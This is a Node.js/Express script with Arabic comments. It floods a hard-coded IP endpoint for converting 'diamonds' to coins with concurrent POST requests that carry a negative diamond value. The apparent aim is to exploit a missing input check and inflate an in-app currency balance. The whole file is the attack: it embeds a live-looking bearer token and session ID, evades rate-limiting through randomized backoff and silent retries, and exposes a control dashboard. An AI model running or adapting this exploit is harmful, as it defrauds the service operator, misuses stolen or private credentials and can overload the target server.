const express = require('express');
const axios = require('axios');
const http = require('http');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// إعدادات الهدف الأساسي
const TARGET_URL = "http://147.93.20.67/api/convert/diamondToCoins";
const REQ_HEADERS = {
    "Authorization": "Bearer 230607|dOBrAYn2anIAPTPeTxkaoOMExeooT5OyzZ9HC3Qec2e16b0a",
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "User-Agent": "ktor-client",
    "Content-Type": "application/json",
    "Host": "147.93.20.67",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "sessionId": "073ef2eb-f0d9-42a2-9f5f-96f580917c16"
};
const REQ_PAYLOAD = { "diamonds": -4.595995949488448 };

// وكيل إدارة الاتصالات (Http Agent) لتدوير المنافذ وإبقائها مفتوحة بسرعة عالية
const httpAgent = new http.Agent({ 
    keepAlive: true, 
    maxSockets: 150, 
    maxFreeSockets: 50, 
    timeout: 60000 
});

// متغيرات التحكم والإحصائيات
let engineStats = {
    success: 0,
    failed: 0,
    total: 0,
    isRunning: true,
    isThrottled: false,
    activeConnections: 0
};
let serverLogs = [];

// دالة تسجيل العمليات حياً وضمان عدم امتلاء الذاكرة
function appendLog(message, level = 'info') {
    const timeStamp = new Date().toLocaleTimeString('ar-EG', { hour12: false });
    serverLogs.unshift({ id: Date.now() + Math.random(), time: timeStamp, message, level });
    if (serverLogs.length > 15) serverLogs.pop();
}

const CONCURRENCY_LIMIT = 40;
let mainInterval = null;
let globalCounter = 1;

// دالة تنفيذ الطلب الفردي مع معالجة حركية للتراجع وتفادي الحظر
async function executeRequest(requestId) {
    if (!engineStats.isRunning) return;

    if (engineStats.isThrottled) {
        // تهدئة حركية عشوائية إذا كان السيرفر يعاني
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1500));
    }

    engineStats.activeConnections++;
    engineStats.total++;

    try {
        const response = await axios.post(TARGET_URL, REQ_PAYLOAD, { 
            headers: REQ_HEADERS, 
            httpAgent: httpAgent, 
            timeout: 15000 
        });

        if (response.status === 200) {
            engineStats.isThrottled = false;
            engineStats.success++;
            appendLog(`طلب #${requestId} 🚀 نجح بالكامل | الحالة: 200`, 'success');
        }
    } catch (error) {
        engineStats.failed++;
        const statusDetails = error.response ? `الحالة ${error.response.status}` : (error.code || 'TIMEOUT');
        
        if (!engineStats.isThrottled) {
            engineStats.isThrottled = true;
            appendLog(`⚠️ رصد حظر أو ضغط من الهدف (${statusDetails}). تفعيل نظام التراجع والتهدئة التلقائي...`, 'warn');
        } else {
            appendLog(`طلب #${requestId} ❌ فشل مؤقت بسبب: ${statusDetails}`, 'danger');
        }

        // آلية الإنقاذ وإعادة المحاولة التلقائية الصامتة في الخلفية بعد فواصل ذكية
        setTimeout(async () => {
            if (!engineStats.isRunning) return;
            try {
                const retryResponse = await axios.post(TARGET_URL, REQ_PAYLOAD, { headers: REQ_HEADERS, httpAgent: httpAgent, timeout: 20000 });
                if (retryResponse.status === 200) {
                    engineStats.success++;
                    engineStats.failed--;
                    appendLog(`طلب #${requestId} 🔄 نجحت محاولة الإنقاذ البديلة!`, 'success');
                }
            } catch (retryError) {}
        }, Math.random() * 3000 + 2000);
    } finally {
        engineStats.activeConnections--;
    }
}

// دالة تفعيل المحرك التكراري
function runEngine() {
    if (mainInterval) clearInterval(mainInterval);
    mainInterval = setInterval(() => {
        if (engineStats.isRunning && engineStats.activeConnections < CONCURRENCY_LIMIT) {
            executeRequest(globalCounter++);
        }
    }, 75); // فواصل زمنية مدروسة للحفاظ على استقرار الـ Event Loop
}

// تشغيل ذاتي عند الإقلاع
runEngine();
appendLog("⚡ تم تشغيل محرك التدفق الاحترافي بنجاح.", "info");

// واجهات الـ API لنقل البيانات للـ HTML
app.get('/api/metrics', (req, res) => res.json({ stats: engineStats, logs: serverLogs }));

app.post('/api/engine/stop', (req, res) => {
    engineStats.isRunning = false;
    appendLog("🛑 تم إيقاف تدفق المحرك مؤقتاً بطلب من المشرف.", "warn");
    res.json({ status: "stopped" });
});

app.post('/api/engine/start', (req, res) => {
    engineStats.isRunning = true;
    runEngine();
    appendLog("▶️ تم إعادة تنشيط المحرك وضخ الطلبات.", "success");
    res.json({ status: "running" });
});

app.post('/api/engine/reset', (req, res) => {
    engineStats.success = 0;
    engineStats.failed = 0;
    engineStats.total = 0;
    serverLogs = [];
    appendLog("🧹 تم تصفير كافة العدادات ولوحة السجلات.", "info");
    res.json({ status: "cleared" });
});

// تقديم واجهة العرض
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// جدار حماية السكربت من الانهيار المفاجئ في بيئة الإنتاج (Anti-Crash Global Shields)
process.on('unhandledRejection', (reason, promise) => { console.error(reason); });
process.on('uncaughtException', (error) => { console.error(error); });

app.listen(port, () => {
    console.log(`Professional server active on port ${port}`);
});